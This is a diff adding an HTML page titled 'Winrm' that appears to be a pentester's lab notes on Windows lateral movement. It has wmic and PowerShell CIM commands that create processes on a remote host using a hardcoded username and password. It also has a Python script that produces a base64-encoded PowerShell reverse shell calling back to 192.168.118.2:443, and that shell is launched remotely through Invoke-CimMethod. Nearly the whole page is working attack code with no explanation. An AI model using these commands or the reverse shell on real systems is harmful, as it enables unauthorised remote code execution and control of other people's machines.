@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Winrm</title>
+</head><body>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"<br/>
+<br/>
+$username = 'jen'; $password = 'Nexus123!'; $secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString; &nbsp; <br/>
+<br/>
+$options = New-CimSessionOption -Protocol DCOM $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options $command = 'calc'; &nbsp; <br/>
+<br/>
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}; &nbsp; <br/>
+<br/>
+import sys import base64 payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode() print(cmd) &nbsp; <br/>
+<br/>
+$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...<br/>
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';<br/>
+<br/>
+$username = 'jen'; &nbsp; <br/>
+$password = 'Nexus123!'; &nbsp; <br/>
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;<br/>
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;<br/>
+$Options = New-CimSessionOption -Protocol DCOM<br/>
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options<br/>
+$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...<br/>
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';<br/>
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
